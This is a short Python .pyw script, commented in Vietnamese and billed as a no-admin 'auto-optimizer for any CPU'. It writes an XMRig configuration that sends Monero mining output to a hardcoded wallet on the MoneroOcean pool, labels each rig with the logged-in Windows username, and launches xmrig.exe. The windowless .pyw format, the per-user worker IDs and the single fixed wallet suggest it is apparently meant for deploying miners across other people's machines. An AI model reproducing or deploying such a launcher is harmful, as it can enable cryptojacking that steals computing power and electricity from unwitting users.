# File: ULTRA_MAX_2025.pyw - AUTO TOI UU MOI LOAI CPU KHONG CAN ADMIN
import os, json, getpass, subprocess, platform
dir_path = os.path.dirname(__file__)
config_path = os.path.join(dir_path, "config.json")
xmrig_exe = os.path.join(dir_path, "xmrig.exe")
worker = getpass.getuser()
print(f"[+] ULTRA MAX 2025 - Worker: {worker}")
print("[+] Auto phat hien CPU - Toi uu cho moi dong may...\n" + "="*80)

threads = os.cpu_count() or 4
cpu_name = platform.processor().lower()
is_intel = "intel" in cpu_name
is_amd = "amd" in cpu_name or "ryzen" in cpu_name

if threads <= 4:
    use_threads = max(1, threads // 2)
    rx_mode = "light"
    gb_pages = False
elif 4 < threads <= 8:
    use_threads = threads - 2
    rx_mode = "medium"
    gb_pages = False
elif 8 < threads <= 16:
    use_threads = threads
    rx_mode = "fast"
    gb_pages = False
else:
    use_threads = threads
    rx_mode = "fast"
    gb_pages = False

rx_list = list(range(use_threads))
print(f"[+] CPU: {cpu_name}")
print(f"[+] Tong thread: {threads} -> Su dung: {use_threads} thread | Mode: {rx_mode}")

config = {
    "autosave": True,
    "background": False,
    "colors": True,
    "randomx": {
        "1gb-pages": gb_pages,
        "mode": rx_mode,
        "numa": True
    },
    "cpu": {
        "enabled": True,
        "huge-pages": False,
        "huge-pages-jit": False,
        "hw-aes": True,
        "priority": 3,
        "yield": True,
        "memory-pool": False,
        "max-threads-hint": 100,
        "rx": rx_list
    },
    "pools": [{
        "algo": "rx/0",
        "url": "gulf.moneroocean.stream:443",
        "user": "4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGpYPkUbB7t2qaKr4g",
        "pass": "x",
        "rig-id": worker,
        "tls": True,
        "keepalive": True
    }],
    "donate-level": 0,
    "print-time": 10
}

with open(config_path, "w", encoding="utf-8") as f:
    json.dump(config, f, indent=4)

print(f"[+] DA GHI CONFIG ULTRA - Hashrate uoc tinh: ~{use_threads*90}-{use_threads*120} H/s")
print("[+] Bat dau dao...\n" + "="*80)
subprocess.call([xmrig_exe], cwd=dir_path)